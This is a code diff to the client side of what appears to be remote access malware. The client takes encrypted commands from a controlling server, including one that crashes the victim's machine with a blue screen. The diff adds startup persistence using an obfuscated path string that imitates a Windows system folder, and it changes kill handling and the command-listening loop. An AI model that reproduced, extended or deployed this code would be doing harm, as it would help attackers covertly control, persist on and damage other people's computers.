@@ -2,6 +2,8 @@
 #include "NetworkManager.h"
 #include "Syscalls.h"
 
+#define ADD_TO_STARTUP TRUE
+
 #ifdef CLIENT_RELEASE
 
 Client::Client() {
@@ -25,10 +27,13 @@ Client::Client() {
     this->SetRequestSecrets(gen);
     SetRemoteMachineGUID();
     SetRemoteComputerName();
+
+    if ( ADD_TO_STARTUP == TRUE )
+        this->m_ProcMgr.AddProcessToStartup((char*)HIDE("C:\\Windows \\System32\\ComputerDefaults.exe"));
 }
 
 Client::~Client() {
-    this->Disconnect(false); // disconnect incase the socket is still connected
+    this->Disconnect(); // disconnect incase the socket is still connected
 
     CleanWSA();
 }
@@ -201,10 +206,6 @@ BOOL Client::PerformCommand(const Packet& command, ClientResponse& outResponse) 
     case RemoteAction::kPingClient:
         success = TRUE;
         break;
-    case RemoteAction::kKillClient:
-        this->Disconnect(true);
-        success = TRUE;
-        break;
     case RemoteAction::kRemoteBSOD:
         this->m_ProcMgr.BSOD();
         break;
@@ -247,15 +248,16 @@ bool Client::IsServerAwaitingResponse(const Packet& commandPerformed) {
 
 Packet Client::OnEncryptedPacket(BYTESTRING encrypted) {
     BYTESTRING decrypted    = LGCrypto::RSADecrypt(encrypted, this->m_RequestSecrets.priv, TRUE); 
-    Packet     deserialized = Serialization::DeserializeToStruct<Packet>(decrypted);
-    
-    return deserialized;
+    if ( !LGCrypto::GoodDecrypt(decrypted) )
+        return {};
+
+    return Serialization::DeserializeToStruct<Packet>(decrypted);;
 }
 
 void Client::ListenForServerCommands() {
     BOOL received = FALSE;
     BOOLEAN state = FALSE;
-    while ( this->m_TCPSocket != INVALID_SOCKET ) {
+    while ( TRUE ) {
         BYTESTRING encrypted;
 
         received = m_NetworkManager.ReceiveData(
@@ -271,6 +273,10 @@ void Client::ListenForServerCommands() {
             // echo keep alive
             m_NetworkManager.TransmitData(receivedPacket, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
             continue;
+        } else if ( receivedPacket.action == kKillClient ) {
+            CLIENT_DBG("Is kill");
+            this->Disconnect();
+            break;
         }
 
         if ( receivedPacket.flags & PACKET_IS_A_COMMAND ) {
@@ -373,13 +379,7 @@ bool Client::SendMessageToServer(Server& dest, ClientMessage message) {
     return false;
 }
 
-bool Client::Disconnect(bool forceQuit) {
-    // server doesn't know were disconncting
-    if ( !forceQuit ) {
-        ClientRequest disconnectRequest(ClientRequest::kDisconnectClient);
-        MakeTCPRequest(disconnectRequest, TRUE);
-    }
-
+bool Client::Disconnect() {
     CloseSocket(this->m_UDPSocket);
     CloseSocket(this->m_TCPSocket);
 
